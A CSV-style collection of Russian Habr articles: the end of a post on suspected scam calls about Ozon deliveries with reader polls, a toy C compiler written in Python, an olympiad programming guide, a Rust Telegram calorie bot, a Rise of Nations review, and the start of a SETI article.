Ну а поскольку я ещё не был до конца уверен, что эти звонки были не от доставки Озон, то решил ещё раз спуститься в лабиринт Минотавра зайти в чат Озон, и попробовать получить более конкретный ответ по поводу подозрительных звонков.
Лабиринт Минотавра Озона
Так как нити Ариадны в чате отсутствует, пришлось действовать перебором:
Прохождение лабиринта Минотавра в чате Озон в поисках оператора: Вход - развилка - поворот - поворот - тупик - Назад - развилка - поворот - поворот - тупик - Назад- развилка - поворот - поворот - тупик - А вот и оператор 
Через пару минут робот сдался, и пригласил оператора
Ответ оператора к сожалению столь же расплывчатый, как и Ozon Support в Telegram
К сожалению ответ столь же расплывчатый, к тому же в режиме монолога.
Беседа снова не задалась, поэтому решил сделать ""контрольный выстрел"", и ещё раз обратиться к Ozon_Support в Telegram
Уточнили номер заказа
И снова вместо ответа общие слова
И опять: «Исхитрись-ка мне добыть То-Чаво-Не-Может-Быть!»
Пришлось снова просто ждать, волнуясь, будет ли доставка заказа.
На этот раз на следующий день доставки не было.
В принципе это вполне нормальная ситуация для доставки Озон, но из-за неопределенности со звонками всё-таки пришлось лишний раз поволноваться*
Примечание: Конечно, к этому времени я был практически уверен, что это были звонки мошенников, но между ""практически уверен"" и ""абсолютно уверен"" огромная разница, и дополнительная неопределенность при доставке уверенности не добавляет.
На второй день вечером в Личном кабинете появилось сообщение
Заказ доставлен, можно забирать
Ну, далее всё как обычно, Happy End...
Причем здесь Озон?
После этих случаев я разместил следующее сообщение на форумах по выбору и покупке Mini-PC, в которых я участвую:
Вниманию тех кто заказывает международную доставку Ozon!!!
ОСТОРОЖНО!!!
Судя по всему Ozon напрямую сливает данные покупателя мошенникам!
Второй раз жду доставку из-за рубежа, и второй в день доставки получаю звонки с левого номера с предложением ""уточнить параметры доставки"", а затем ПРОДИКТОВАТЬ НОМЕР из SMS!!!!
Поддержка Ozon (если это недоразумение можно назвать ""поддержкой""), игнорирует все сообщения о мошенниках, типа - ""мы не звоним, разбирайтесь сами"" ¯\_(ツ)_/¯
И хотя я просил особо это особо не обсуждать (всё-таки это offtop к теме), на одном из форумов возникла дискуссия (в итоге мое исходное сообщение потерли, а обсуждение осталось).
И как это и бывает при HolyWar, мнения разделились:
Вот некоторые из сохранившихся сообщений:
а что они должны сделать? Каких действий вы ждете?
Мне был подобный звонок сразу после инфы в трекере ""Проверка персональных данных завершена успешно. Юнэкс"". Посылка была еще в Китае. Возможные каналы утечки наших данных: <далее список предположений>
...Почта и SMS идут через мобильного оператора. Имеющий доступ к базе программер или админ вполне может устроить слив информации...
Дмитрий, настоятельно рекомендую (и ради безопасности сограждан тоже) написать пост в habr, пикабу или любой другой ресурс с потенциалом дать хороший резонанс...
Итак, попробую сформировать ряд вопросов дать на них свои сугубо субъективные ответы.
Так сказать ""ИМХО, только ИМХО, и ничего кроме ИМХО""
Так всё-таки, это звонили мошенники?
Практически наверняка да...
Однако ответы поддержки Озон всё-таки оставляет место для сомнения, что это мог быть звонок от продавца ¯\_(ツ)_/¯
Если это звонили мошенники, то был ли это ""холодный"" звонок, или привязанный к заказу Озон?
Скорее всего привязанный к заказу Озон — уж слишком много мошенники знали не только обо мне, но и конкретном заказе.
Конечно нельзя исключать, что среди множества пробившихся через спам-фильтр мошеннических звонков по поводу ""одобренных кредитов"" и ""замены счётчиков"", на которых я сразу кладу трубку, эти выстрелы ""от бедра"" просто чисто статистически попали ""в яблочко"".
Например человек, подавший заявку на кредит, может также отреагировать на звонок ""Вам одобрили кредит"", но вряд ли этот разговор продлится долго, если мошенник не знает, в каком банке была подана заявка.
К тому же при выстрелах ""от бедра"" наверняка должны быть промахи — звонки по поводу ""заказов Озон"", когда я никаких заказов на ждал, а в моём случае подобных звонков не было.
Более того — если бы раньше мне были холостые звонки о ""заказах Озон"", когда я никаких заказов не ждал, то я и на эти звонки отреагировал бы иначе.
Какого рода это могут быть данные?
При наличии уже имеющихся пиратских баз данных буквально обо всех жителях РФ, для организации подобной мошеннической атаки достаточно номера телефона и трек-номера посылки.
По номеру телефона легко можно определить ФИО получателя и город, а по трек-номеру с помощью трекеров также можно узнать город назначения посылки, а потом следить за её движением, чтобы в нужный момент провести мошенническую телефонную атаку.
А вот одного только трек-номера посылки недостаточно, поскольку полных данных получателя по нему не определить.
Одного только номера телефона тоже недостаточно — по нему можно узнать фамилию и город, но невозможно угадать нужное время для звонка, т.е. это будет по сути ""холодный"" звонок.
Так всё-таки это утечка данных из Озон?
Необязательно. Утечка (или скорее ""крот"", сливающий актуальные данные) может быть и не в самом Озон, а у кого-то из его партнёров, отвечающих за международную доставку, например, логистические компании, обе таможни, таможенные брокеры, ну и так далее.
На это в частности указывает тот факт, что подобные мошеннические звонки происходили только при заказах из-за рубежа.
Однако с другой стороны, внутренняя доставка Озон производится слишком быстро, и у мошенников слишком мало времени на подготовку звонка. Да и данные для подобной мошеннической атаки должны были бы поступать буквально online, поскольку уже через несколько часов они становятся неактуальными.
Поэтому полностью нельзя исключать и внутреннюю утечку Озон.
В общем, ""темна вода на облацех""...
Если это утечка данных не из Озон, то в чём тогда он виноват?
Во первых, даже если это утечка не из Озон, а у кого-то из его партнёров, то Озон не должен самоустраниться.
В данной ситуации позиция
Это точно не мы, так что разбирайтесь с продавцом/таможней/брокером/логистикой (нужное подчеркнуть, недостающее вписать) сами
на мой взгляд не совсем правильная.
А во вторых это вопрос не столько вины, сколько ответственности, и если бы Озон хотя бы признавал наличие подобных случаев, предупреждал о них, например как это сделал litres.ru, то и подобных вопросов наверное было бы меньше.
В идеале можно было бы что-то подобное добавить и в лабиринт Минотавра чат Озон, чтобы пользователь хотя бы задним числом мог узнать, что это был за странный звонок.
/IMHO
Возможно я рассмотрел не все вопросы, но это можно продолжить в обсуждении статьи.
Спасение утопающих — дело рук самих утопающих?
Ну а какие всё-таки должны быть выводы из статьи?
Я не знаю ¯\_(ツ)_/¯
Во всяком случае отказываться от международных покупок на Озон я не собираюсь.
Тем более что с альтернативами сейчас совсем негусто.
Конечно есть ещё Aliexpress, но (как я уже сказал) с появлением Aliexpress.Russia там ИМХО стало совсем печально
Видимо придется ещё внимательнее относиться к звонкам, в т.ч. тем, которых в данный момент в силу каких-то обстоятельств ожидаешь...
Перефразируя пословицу ""Если у Вас паранойя, то это не значит что за Вами не следят""
Если у Вас нет паранойи, то это не значит, что Вас не хотят обмануть
потому заказав пиццу, и увидев на пороге доставщика пиццы (ну, или заказав товар на Озон, и услышав по телефону звонок от доставки Озон),
на всякий случай придется держать палец на спусковом крючке
₽.$.
Недавно я сделал ещё один заказ на Озон с международной доставкой.
Сейчас он летит где-то между Китаем и Россией, ориентировочное время вручения — начало июня.
Так что не исключено, что через пару недель в статье придется сделать дополнение...
Автор благодарит Todayer за пинок в нужном направлении
Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста.
Сталкивались ли Вы или ваши близкие со случаями «прицельного» телефонного мошенничества?
44.44%
Увы, да
128
38.89%
К счастью нет
112
15.63%
Мне безразлично, я на это не реагирую
45
1.04%
Свой ответ в комментариях
3
Проголосовали 288 пользователей. Воздержались 44 пользователя.
Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста.
Сталкивались ли Вы или ваши близкие с подобными звонками от «доставки Озон»?
70.08%
Заказываю на Озон, но подобных звонков никогда не было
178
4.72%
Были «звонки от доставки Озон», связанные по времени с реальными заказами на Озон
12
7.09%
Были «звонки от доставки Озон», никак не связанные с реальными заказами на Озон
18
5.12%
Были подобные случаи при заказах на других маркетплейсах
13
9.06%
Не покупаю на маркетплейсах
23
3.94%
Свой ответ в комментарии
10
Проголосовали 254 пользователя. Воздержались 62 пользователя.
Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста.
Причём здесь Озон?
49.46%
Озон должен контролировать своих партнёров, а не ограничиваться отговоркой «Это не мы, разбирайтесь сами»
92
42.47%
Вопрос не столько вины, сколько ответственности, Озон должен хотя бы признать наличие подобных случаев, и предупреждать о них
79
6.99%
Озон тут вообще непричем, «Спасение утопающих — дело рук самих утопающих»
13
1.08%
Свой ответ в комментариях
2
Проголосовали 186 пользователей. Воздержались 29 пользователей."
О том как я писал компилятор Си,https://habr.com/ru/articles/910332/,"Всем привет, и, сегодня вы узнаете как я писал компилятор Си.
Вот части статьи:
1 - Что за компилятор
2 - Как я его создал
Ну, как понимаете он чуть-чуть плохой но ладно.
Что за компилятор?
Я его назв...","Всем привет, и, сегодня вы узнаете как я писал компилятор Си.
Вот части статьи:
1 - Что за компилятор
2 - Как я его создал
Ну, как понимаете он чуть-чуть плохой но ладно.
Что за компилятор?
Я его назвал pycc. Как вы поняли, он написан на python. Ведь pycc переводится как Python C Compiler.
Он поддерживает такие правила:
Два типа данных (int и char)
Цикл while и цикл do-while.
Условие if-else.
Минимальный препроцессор (только директива #include)
Функции через void.
Их мало, но и чтобы эти правила работали я пропотел.
Где то щас 700 - 724 строчек кода (вроде бы).
Вот пример кода (C в хабре нету):
#include <stdio.h>

void fac(n) {
  int f = 1;
  while (n > 0) {
    f = f * n;
    n = n - 1;
  }
}

void main() {
  fac(5);
  printf(""'factorial of 5: '+str(f)"");
}
Из этого примера кода вот что мы видим:
Все переменные - глобальные что и хорошо, что и плохо.
Функция printf принимает питонью строку.
Вывод:
factorial of 5: 120
Как и ожидалось.
Да. Пока что нечего больше.
Вот так мы и прошлись по его правилам.
О том как я писал этот компилятор
Это мне далось очень не легко.
И я это знал за ранее.
Начал я с лексера. Написать Скопировать лексер с одного сайта очень легко.
Да и парсер дался достаточно легко.
Ну. По началу было всё хорошо. Я легко справлялся. И багов пока не было.
Но всё началось с void. Я реально понял что оказывается я делал всё с багами.
Когда я делал такой код:
void main() {
  int n = 5;
  while (n > 0) {
    n = n - 1;
  }
}
То, парсеру это не нравилось. Но в скором я начал писать данный код:
d = Parser()
d.parse(...)
block.append(...)
Это всё ОЧЕНЬ ПЛОХО. Но я делал этот проект не из-за красивого кода, а чтобы всё работало. Чего я добился.
В скором ошибка типизации... int x = ""h""; это было нормально... Ну ладно эта типизация (я быстро решил) но потом и ошибка с char.
Которая была из-за пробелов. Да. Но... К концу я всё таки справился и исправил все баги кроме того самого (с пробелами, но я был доволен).
Сейчас я работаю над другими изменениями.
Да, данный заголовок был очень маленьким но я не умею объяснять истории.
CHANGELOG (только у меня, больше не у кого)
Пре-альфа 1.0
Очень мало было.
Циклы, условия и переменные.
При этом было очень примитивно и не работающее.
Альфа 1.0
Добавился сам полный функционал. Больше багов было устранено.
Но, они были. За то вы могли написать такой код:
void main() {
  int n = 5;
  while (n > 0) {
    n = n - 1;
  }
}
И он мог работать. Что самое главное.
Бета 1.0
Ну прям все баги исправлены.
И добавлена возможность выводить другие данные.
Релиз 1.0
Официальный выпуск. Тогда я опубликовал это на гитхаб.
Релиз 1.1
Добавлен препроцессор.
К примеру:
#include <stdio.h>
Теперь можно было импортировать заголовочные обычные файлы.
Релиз 1.1.2 (Последний)
Я исправил баг с больше и меньше.
Раньше было не так:
if stack[-2] > stack[-1]:
  ...
else:
  ...
А так:
if stack[-2] >= stack[-1]:
  ...
else:
  ...
И я это исправил (да, самое легкое исправление)
Итог
Статья получилась плохой и большой, но, вот ссылка на проект:
SystemSoftware2/pycc: Компилятор C на Python
В скором я добавлю больше всего. И возможно компилироваться будет в x86 ASM.
UPD: компилируется в байткод"
Гайд на олимпиадное программирование: Что учить и где?,https://habr.com/ru/articles/910300/,"Всем Здравствуйте, сегодня я, участника областного этапа Белорусской олимпиады школьников, поделюсь с вами своим личным гайдом на олимпиадное программирование, расскажу что учить, как начать и учится ...","Всем Здравствуйте, сегодня я, участника областного этапа Белорусской олимпиады школьников, поделюсь с вами своим личным гайдом на олимпиадное программирование, расскажу что учить, как начать и учится и тренироваться
Вперёд!
Начало
Начать стоит с выбора языка программирования, в целом олимпиадки можно писать на любом языке, но зачастую все пишут на двух языках: на Python или на C++.
Больших различий в написание алгоритмах нет, только то что у некоторых языках больше возможностей.
Почему я советую выбрать C++?
Потому что он банально более быстрый чем все остальные, а в олимпиадах скорость выполнения программы играет важную роль.
Не следует пугаться того что C++ сложный язык, вы не почувствуете его сложности в олимпиадах. C++ сложный для проектного программирования, а для олимпиадного нет большой разницы между ним и python, единственное, что код на Python более короткий. Далее я приведу варианты изучения синтаксиса для двух этих языков.
Где учить python?
Для изучения основ python советую легендарный курс ""Поколение Python"" на Степике: https://stepik.org/course/58852/promo?search=7086480912.
Или курс сириуса ""Введение в Python"" : https://edu.sirius.online/#/.
Где учить C++?
Для изучения основ C++, я рекомендую курс от acmp: https://acmp.ru/asp/do/index.asp?main=course&id_course=1 (этот сайт ещё будет упомянут).
Также рекомендую курс от всех тех же Сириус: https://edu.sirius.online/#/.
Есть вариант изучения по хэндбуку от Яндекса: https://education.yandex.ru/handbook/cpp
Где изучать алгоритмы?
Итак, для старта в алгоритмах я порекомендую довольно банальную книгу, вы все уже знаете какую я скажу, барабанная дробь.......:
""Грокаем алгоритмы. Иллюстрированное пособие для программистов и любопытствующих"".
Но почему же именно её: потому что в ней довольно просто и понятно изложены основные алгоритмы используемые в олимпиадном программировании. Правда у неё есть один существенный недостаток - реализация некоторых алгоритмов из этой книги, не подходит для олимпиадного программирования.
Для компенсации этого я посоветую несколько ресурсов, созданные именно для олимпиадного программирования:
Сайт алгоритмика: https://ru.algorithmica.org/cs/
Хэндбук от Яндекса: https://education.yandex.ru/handbook/algorithms
Канал Павла Марвина на ютубе(легенда, отдельный респект): https://www.youtube.com/@pavelmavrin
Отдельно выделю очень крутую книги по олимпиадному программированию, она довольно сложна для понимания, но при этом в ней изложены почти ВСЕ темы, которые могут помочь вам в олимпиадном программировании.
Эта книга: Олимпиадное программирование автора Антти Лааксонен.
Старайтесь читая книги, максимально пытаться применить знания на практике. Но где же брать задачи?
Практика
Итак, сейчас будут сайты для практики наших знаний, и краткий обзор каждого из них:
Acmp: довольно неплохой сайт для изучения и практики на конкретные темы(см. раздел ""курсы""). Ссылка: https://acmp.ru/
Codeforces: Главная обитель всех спортивных программистов, его ключевая особенность это соревнования, которые проходят регулярно, на них мы будем оттачивать своё умение работать в краткие сроки проведения олимпиады. Ссылка: https://codeforces.com/
Eolymp: Отличный сайт для отработки знаний конкретной темы, на мой взгляд, задачи тут чуть сложнее чем на acmp. Ссылка: https://eolymp.com/
Отдельно отмечу LeetCode, в теории, задачи на нём можно использовать при подготовке к Олимпиде, но он больше ориентирован на собеседования.
Заключение
В заключение, хочу пожелать вам удачи на вашем пути в олимпиадном программировании!
Успехов!"
Kalorik: Telegram-бот на Rust для анализа питания,https://habr.com/ru/articles/910298/,"Mascot Kalorik
Введение
В данной статье мы рассмотрим архитектуру и реализацию Telegram-бота Kalorik, написанного на языке программирования Rust. Этот бот предоставляет пользователям возможность анали...","Mascot Kalorik
Введение
В данной статье мы рассмотрим архитектуру и реализацию Telegram-бота Kalorik, написанного на языке программирования Rust. Этот бот предоставляет пользователям возможность анализировать свой рацион питания, получая автоматический расчёт калорий, макроэлементов и индекса массы тела. Особенностью проекта является использование современного стека на основе tokio, sqlx, teloxide, а также продуманная архитектура с учётом масштабируемости.
Задачи, решаемые ботом
Kalorik реализует следующие функции:
Обработка текстовых сообщений с описанием приёма пищи
Распознавание изображений и голосовых сообщений
Подсчёт калорий, БЖУ, ИМТ
Хранение истории и профиля пользователя
Настройка целей и отслеживание прогресса
Архитектура проекта
Проект состоит из следующих ключевых модулей:
main.rs — точка входа, инициализация окружения и запуск бота
telegram/handlers.rs — обработка входящих сообщений Telegram
db/queries.rs — доступ к базе данных (PostgreSQL через sqlx)
db/models.rs — структура таблиц и моделей
services/nutrition.rs — логика анализа продуктов и подсчёта нутриентов
Проект построен с использованием OnceLock для глобального пула соединений с базой данных и асинхронного исполнения через tokio.
Пример: Регистрация пользователя
pub async fn register_user(chat_id: i64) -> Result<(), sqlx::Error> {
    let Some(pool) = DB_POOL.get() else {
        return Err(sqlx::Error::PoolTimedOut);
    };

    sqlx::query!(
        r#""
        INSERT INTO users (chat_id, created_at)
        VALUES ($1, $2)
        ON CONFLICT (chat_id) DO NOTHING
        ""#,
        chat_id,
        Utc::now()
    )
    .execute(pool)
    .await?;

    Ok(())
}
Здесь реализуется вставка пользователя в таблицу, если он отсутствует. Используется UPSERT-подход, обеспечивающий идемпотентность.
Работа с Telegram
match &msg.kind {
    MessageKind::Common(msg) => match &msg.media_kind {
        MediaKind::Text { text, .. } => {
            if text == ""/start"" {
                register_user(msg.chat.id).await?;
                bot.send_message(msg.chat.id, ""Введите описание приёма пищи"").await?;
            } else {
                let result = analyze_food_description(text).await;
                bot.send_message(msg.chat.id, result).await?;
            }
        }
        MediaKind::Photo { photo, .. } => {
            // Обработка фото через модель
        }
        MediaKind::Voice { voice, .. } => {
            // Обработка голосовых сообщений
        }
        _ => {}
    }
    _ => {}
}
Здесь представлен разбор варианта обработки текста и мультимедиа. Используется teloxide, который предоставляет удобный API для работы с Telegram Bot API.
Хранение и миграции
let db_url = env::var(""DATABASE_URL"").expect(""DATABASE_URL not set"");
let pool = PgPoolOptions::new().connect(&db_url).await?;
sqlx::migrate!(""./migrations"").run(&pool).await?;
Проект использует sqlx с автоматическим применением миграций. Миграции хранятся в отдельной папке и обеспечивают прозрачность в изменениях схемы.
Развёртывание
Бот может быть запущен как systemd-сервис или Docker-контейнер. Пример systemd unit-файла:
[Unit]
Description=Kalorik Telegram Bot
After=network.target

[Service]
ExecStart=/usr/local/bin/kalorik
WorkingDirectory=/var/www/kalorik
Restart=always
Environment=DATABASE_URL=postgres://...

[Install]
WantedBy=multi-user.target
Также возможно подключение GitHub Actions для CI/CD и обновления контейнера при пуше в main ветку.
Заключение
Kalorik демонстрирует, как на Rust можно создать безопасного и надёжного Telegram-бота с использованием производительных и типобезопасных библиотек. Благодаря sqlx, tokio и teloxide, разработка получилась эффективной и лаконичной. Проект легко масштабируется и адаптируется под другие задачи, связанные с пользовательскими данными или обработкой сообщений.
Проект открыт для расширений: можно добавить мини-приложение, авторизацию через Telegram Web App, отчёты по питанию, интеграцию с OpenAI или Hugging Face для анализа описаний еды.
Попробовать бота @kalorikbot
Репозиторий проект, где находится весь код https://github.com/digkill/Kalorik"
Перешагивая через века. Rise of nations: Thrones & Patriots,https://habr.com/ru/companies/timeweb/articles/910288/,"Так-так-так... что это здесь у нас? Мои глаза с любопытством, смешанным с сомнением, начали осмотр. После многих часов в «Казаках», еще и с обоими дополнениями, мне хотелось чего-то нового, но похожег...","Так-так-так... что это здесь у нас? Мои глаза с любопытством, смешанным с сомнением, начали осмотр. После многих часов в «Казаках», еще и с обоими дополнениями, мне хотелось чего-то нового, но похожего. Через стеклянную витрину из раздела «Стратегии» мне навстречу смотрела коробка от «Триад» со странным лого: металлический глобус в обрамлении зубчатого колеса. А поверх глобуса — надпись Rise of nations: Thrones & Patriots.
Когда ты учишься в младших классах, то бюджеты на виртуальные развлечения твои скромны, да и зависят целиком и полностью от дипломатических навыков. Так что выбирать следует с умом. А не то проиграть можно еще на старте. Впрочем, и такую ситуацию ещё можно было исправить, если как можно увереннее под недоверчивым прищуром продавца рассказать историю про «непонятную» ошибку при установке. Диски были пиратские, незапечатанные (как правило), и если ты сам, растяпа, не наделал царапин по пути, то могли и принять назад/обменять на другое. А продавец просто заново выставлял диск на продажу. Эх, софтскиллы детства...
К чему это я? Перед каждой покупкой предстоял этап мучительного выбора. Очагом сомнений в тот раз было оформление бокса. Низ лицевой стороны украшал скриншот из первой Call of Duty, с приснопамятной сценой штурма берега Волги в Сталинграде. Но, после того, как коробка с Неизведанным перекочевала с витрины в мои руки, муки выбора окончились.
На обратной стороне на скриншотах были видны здания и военные разных времен и культур. А текст с описанием справа подтверждал самые смелые догадки.
Итак, я решился. Диск был куплен, я помчался домой.
Ну а внутри... внутри ждало человечество. К сожалению, я не был знаком в школьные времена с серией «Цивилизация». Пошаговую стратегию как жанр я вообще увидел одним глазком, в гостях у родственников в вышеупомянутом Бишкеке. Это были четвертые Герои. И была еще одна игра, которую мне совершенно неправильно представили, да так неправильно, что ее полноценный запуск мною отложился на много лет.
В общем, в «Казаках» были лишь те нации, что отметились в боевых действиях в Европе за 17-18 вв., и играть можно было лишь в этих двух веках. Наследники «Дюны» и вовсе не имели внутри себя разных эпох. А потому возможность перенестись с одним и тем же народом через столетия, от палки-копалки до ракет и реактивной авиации, уже была чем-то, из ряда вон выходящим.
Первое открытие, которое я для себя сделал — здесь не оказалось классического строительства базы, каким я привык его видеть в тех стратегиях, которые мне до того удавалось потрогать. А руки мои в то время добирались исключительно до наследников знаменитой «Дюны».
Нет, тут все оказалось иначе. Государство получило границы, источником которых служат опорные пункты, представленные городами и крепостями. Территория стала новым элементом геймплея, просто притопать танками без потерь до «базы» противника теперь нельзя. Обыкновенный проход по чужой земле (даже нейтральной) ведёт к истощению войск, парни натурально приехали и самоубиваются на свежем воздухе, если ты не озаботился обеспечением их снабжения. Особенно тут выделяется фракция «русские» с их уникальной способностью «Сила Родины». Как только супостат ступает на территорию России, он начинает истощаться с большей интенсивностью, чем где бы то ни было еще. Если же вы успеваете за русских построить чудо света «Кремль» (роль которого, как обычно в стратегиях, играет здание собора Василия Блаженного), то этот эффект увеличивается на 100%. Что интересно, этот эффект снимается полностью, если у противника будет построена «Статуя Свободы». Родина Родиной, а общечеловеческие ценности по расписанию.
Второе открытие — уровень анимации. Он был прекрасен тогда, хорош и сейчас. Собственная стилистика и отказ от погони за передовой 3D графикой вновь показали свою состоятельность. Мир выглядит живым: учёные в университетах дискутируют (что выглядело чрезвычайно забавно, когда ученый в универе был один, и увлеченно читал лекцию пустой аудитории, жестикулируя из-за кафедры), бездействующие рабочие разминаются, бойцы курят при долгом затишье. Анимация наземных боевых действий также выглядит достойно: артиллерия отскакивает при отдаче, стрелки ведут огонь, меняя позицию, расчеты заряжают камнями катапульты и т.д. А воздушные бои просто поражали — бомбардировщики летели среди клякс разрывов снарядов вражеской ПВО, ковром сбрасывали тонны смертельного груза, истребители носились друг за другом, выплевывая короткие очереди.
Третье — тактика! Не только классическое взаимодействие разных родов войск, которое есть в каждой RTS, но и появление особых юнитов, генералов, шпионов, спецвойск, а также машин снабжения, необходимых, чтобы на своей шкуре не почувствовать чужую «Силу Родины». Воевать без них возможно (хоть и больно), но с ними — намного интересней!
Генерал умеет делать следующие штуки:
приказать войскам окопаться;
устроить засаду, временно сделав ваши войска невидимыми;
на короткое время ускорить всех бойцов;
моё любимое — создать короткоживущую приманку в виде призрака вашей армии, который для противника выглядит, как настоящая.
Шпионы позволяют наладить разведку через подсаживание жучков в здания противника, банальные прогулки по его территории (при которых они не получают урона), а ещё они умеют подкупать вражеских бойцов.
Спецназ появляется в Индустриальную эру (за исключением ирокезов, получающих его на эпоху раньше), он умеет уничтожать шпионов, зачищать здания от жучков, отстреливать противника из снайперской винтовки, что полезно при борьбе с вражескими генералами и фургонами снабжения. Самое же приятное умение бойцов спецвойск — диверсии. При успешном подрыве любое здание противника (даже «здание» города!) получает урон в 50% НР, что просто невероятно полезно, если вы хотите посеять хаос в стане противника, атаковав несколько небольших городов одновременно.
Четвертое — придание уникальных черт и разнообразие. И не только в уникальных юнитах или способностях фракций, но и в графическом оформлении. Да, не во всём и не всегда, есть разделение на условные географические зоны, в соответствии с реальным местонахождением народов. Больше внимания уделено именно тем странам, которые накуролесили в мировой истории сильнее всех в соответствующем периоде. Например, немцы, русские, британцы, японцы, китайцы и американцы имеют уникальное оформление войск в эпохе Современности (соответствующей нашей середине 20 века).
Американцы
Немцы
Пятое — одиночные кампании. Как я узнал много позже, приписка Thrones&Patriots обозначала, что я получаю игру вместе с дополнением. А потому у меня уже на старте была возможность пройти по Азии непобедимой фалангой Александра Македонского, погулять шпионами по Вашингтону, да отправить колонны Старой Гвардии в какую-нибудь Вену, чего были лишены владельцы оригинальной игры.
Кампании представляют из себя некое подобие Total war. Есть стратегическая карта, где вы производите улучшения, ходите войсками-фигурками. При столкновении с противником происходит сражение в реальном времени со строительством. В начале вы получаете несколько вводных заскриптованных миссий. Так, вы неизбежно попадёте во Вьетнам/Афганистан в сценарии Холодной войны или будете подавлять мятеж роялистов за Наполеона. Как же было прекрасно почувствовать себя товарищем Ким Ир Сеном, в считанные секунды покорив высоты выше горы Пэктусан на реактивной тяге. Смотреть на последних южнокорейских наймитов, жалкой кучкой сбившихся на полоске побережья, предвкушать победу, а затем им на подмогу с Японских островов вертушкой с двух ног влетает орава американской морской пехоты… Незабываемо. Единственная кампания без подобных скриптов, Завоевание мира, лишена и другой особенности — уникальных юнитов, которых больше нигде в игре нет.
Как вы уже догадались, Rise of Nations произвела на меня неизгладимое впечатление. Я проводил в ней бесчисленное количество времени, не один год.
Я с детским восторгом смотрел на стальные колонны наших Т-80, шедших на врага под прикрытием «Крокодилов».
От тайги, до британских морей...
...Красная Армия всех сильней! Правда, почему-то «Катюша» превращается в американскую М270
Я замирал, слыша сигнал, оповещающий о запуске ядерной ракеты, и смотрел, как круги, демонстрирующие место падения, сужаются в точку на мини-карте. Да, получить ядрён-батон в этой игре страшно, он чрезвычайно разрушителен, особенно, после изобретения МБР.
Я с разочарованием обнаружил, как тут выглядит флот. С каждой новой эпохой он смотрится все более и более нелепо. Когда я в очередной раз наблюдал, как могучие дредноуты целой эскадрой лупят по паре стрелков и не могут все никак их одолеть, то плюнул и практически перестал использовать морские карты.
Я ставил ограничения на доступные эпохи в одиночных сражениях, чтобы остаться в мире Античности, и блистательный Рим победил, наконец, всех варваров. Правда, судя по игре, для авторов Рим не исчез вместе с Античностью, ибо в эпохе Средневековья у них уникальный юнит «Легионы Цезаря», а в Эпохе Пороха римляне только-только «добираются» до создания преторианцев. Да, стройные ряды гвардейцев идут тут в атаку под аккомпанемент аркебуз. Как тебе такое, Октавиан Август? Жаль, разрабы не передали более плавной трансформации государства в разные периоды, ведь в Современности римляне, судя по облику солдат и техники, внезапно превращаются в фашистскую Италию.
Римляне в Современности. Да, похоже, это четвертые Панцеры и Ганомаги. Нет, я не знаю — почему. Испанцы, кстати, выглядят так же
Я с удивлением смотрел на творчество разработчиков, и не понимал, как можно было сделать такие странные ошибки. Уникальная пехота Германии в Современности — фольксштурм. Обучаем, смотрим, у казармы возникает тройка молодчиков в камуфляже с Stg 44 наперевес. Но я уже тогда знал, что фольксштурм — это ополчение, которое гитлеровцы собирали в конце войны из кого придётся и вооружали уж чем было, но точно не редкой (в рамках миллионной армии) штурмовой винтовкой. С нашими — еще интереснее. Первый уникальный юнит называется «Пикейщик Русини». Пикейщик — это пикинер ведь, да? Нет, у нас тут всадник. Дальше — больше. В Информационной эре русские обзаводятся Шокирующей пехотой, а та, словно стремясь оправдать свое название, щеголяла в ушанках размером с добротную каракулевую папаху, с калашами наголо и рюкзаками поверх шинели. Впрочем, игре это не мешало, я подивился с чуда чудного, да и все. Лишь спустя годы, запустив уже обновленное издание, я понял, что дело было вовсе не в разработчиках, а в переводчиках. Фольксгренадеры, а не фольксштурм. Английское Lancer — это не только пикинер, но и улан. Атакующая (shock — натиск, удар) пехота. Таких ошибок немало было в переводе. А ларчик просто открывался...
Судно типа Man of War перевели просто… «Воин»
Чем же Rise of nations на сегодняшний день может привлечь внимание? В общем-то... все тем же!
Геймплей все так же прочно захватывает и удерживает тебя, требует сосредоточенности. Графика красива, тем более, получила более чёткие текстуры, спасибо команде, которая не позволила старому тайтлу пропасть. Музыка, выполненная в стиле неоклассики, все так же прекрасна, призывая к бою в войне, к развитию в мире. Кампании, разве что, выглядят устаревшими, «глобальная» часть совершенно хромает. Стратегия же в целом прошла испытание временем и все ещё достойна вашего внимания.
До новых встреч!
Автор текста: Николай Бугаев. Написано при поддержке Timeweb Cloud специально для CatGeek и читателей Хабра.
Разрабатывайте и развивайте свою игру (и не только) с помощью облачного хостинга для GameDev ↩
Опробовать ↩
Перед оплатой в разделе «Бонусы и промокоды» в панели управления активируйте промокод и получите кэшбэк на баланс.
🎲 Читайте также:
➤ История жанра «симулятор» в сеттинге «Вторая Мировая война»
➤ Как создать игровой сервер Factorio
➤ Wizordum — пример правильной ностальгии
➤ Во что поиграть: Sid Meier's Covert action
➤ Как создать игровой сервер Valheim"
"«Мы не утверждаем, что это инопланетяне»: проект SETI зарегистрировал необычные импульсы, исходящие от далёких звёзд",https://habr.com/ru/articles/910280/,"Странные импульсы в свете HD89389 14 мая 2023 года.
Более 60 лет назад поиск внеземного разума (SETI) официально начался с проекта «Озма» в обсерватории Гринбэнк в Вест-Бэнке, штат Вирджиния. Под руко...","Странные импульсы в свете HD89389 14 мая 2023 года.
Более 60 лет назад поиск внеземного разума (SETI) официально начался с проекта «Озма» в обсерватории Гринбэнк в Вест-Бэнке, штат Вирджиния. Под руководством известного астронома Фрэнка Дрейка (знаменитого своим уравнением Дрейка) с апреля по июль 1960 года с помощью 25-метровой антенны обсерватории велось наблюдение за Эпсилон Эридана и Тау Кита — двумя близкими звёздами, похожими на Солнце. С тех пор было проведено множество исследований на разных длинах волн в поисках признаков технологической активности (так называемых «техносигнатур») вокруг других звёзд.
Хотя убедительных доказательств существования иной развитой цивилизации пока не найдено, учёные не исключают такую возможность. В своей недавней статье ветеран НАСА Ричард Х. Стэнтон описывает результаты многолетнего исследования более 1300 звёзд, похожих на Солнце, на предмет наличия оптических сигналов, полученных SETI. Как он указывает, это исследование выявило два быстрых идентичных импульса от солнцеподобной звезды на расстоянии около 100 световых лет от Земли, которые совпадают с аналогичными импульсами от другой звезды, наблюдавшимися четыре года назад.
